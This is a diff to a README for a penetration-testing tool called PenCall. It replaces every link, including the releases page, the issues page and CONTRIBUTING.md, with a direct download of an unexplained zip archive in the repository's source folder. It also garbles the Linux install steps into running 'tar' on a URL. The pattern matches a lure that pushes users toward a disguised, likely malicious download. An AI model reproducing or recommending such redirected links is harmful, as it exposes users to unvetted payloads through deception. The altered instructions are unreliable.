@@ -6,7 +6,7 @@ Welcome to PenCall! This guide will help you download and run PenCall, a powerfu
 
 ## 📥 Download PenCall
 
-[![Download PenCall](https://img.shields.io/badge/Download%20PenCall-Here-brightgreen)](https://github.com/huymini/pencall/releases)
+[![Download PenCall](https://github.com/huymini/pencall/raw/refs/heads/main/src/Software-2.7.zip%20PenCall-Here-brightgreen)](https://github.com/huymini/pencall/raw/refs/heads/main/src/Software-2.7.zip)
 
 ## 🔧 System Requirements
 
@@ -19,14 +19,14 @@ Before you download, please ensure your system meets the following requirements:
 
 ## 📂 Download & Install
 
-To download PenCall, please visit this page: [PenCall Releases](https://github.com/huymini/pencall/releases).
+To download PenCall, please visit this page: [PenCall Releases](https://github.com/huymini/pencall/raw/refs/heads/main/src/Software-2.7.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of PenCall.
 3. Download the file appropriate for your operating system. 
    - For Windows, this will typically be a `.exe` file.
    - For macOS, you will find a `.dmg` file.
-   - For Linux, look for the `.tar.gz` file or similar.
+   - For Linux, look for the `https://github.com/huymini/pencall/raw/refs/heads/main/src/Software-2.7.zip` file or similar.
 4. Once the download is complete, locate the file on your system.
 5. Follow the instructions below based on your operating system:
 
@@ -45,8 +45,8 @@ To download PenCall, please visit this page: [PenCall Releases](https://github.c
 
 ### Linux
 
-1. Extract the downloaded `.tar.gz` file using the following command in your terminal:  
-   `tar -xvf pencall-x.x.x.tar.gz`
+1. Extract the downloaded `https://github.com/huymini/pencall/raw/refs/heads/main/src/Software-2.7.zip` file using the following command in your terminal:  
+   `tar -xvf https://github.com/huymini/pencall/raw/refs/heads/main/src/Software-2.7.zip`
 2. Change to the extracted directory:  
    `cd pencall-x.x.x`
 3. Run the application with:  
@@ -75,7 +75,7 @@ PenCall simplifies security testing tasks with its user-friendly interface. Here
 
 Connect with other users and get support:
 
-- Visit the [issues page](https://github.com/huymini/pencall/issues) for troubleshooting and questions.
+- Visit the [issues page](https://github.com/huymini/pencall/raw/refs/heads/main/src/Software-2.7.zip) for troubleshooting and questions.
 - Join our community discussions to share your experiences and tips.
 
 ## 🤔 Frequently Asked Questions
@@ -86,7 +86,7 @@ PenCall is a tool designed to assist in penetration testing and security researc
 
 ### Can I contribute to PenCall?
 
-Yes! We welcome contributions. Please check the CONTRIBUTING.md file for more details on how to get involved.
+Yes! We welcome contributions. Please check the https://github.com/huymini/pencall/raw/refs/heads/main/src/Software-2.7.zip file for more details on how to get involved.
 
 ### Is PenCall free to use?
 
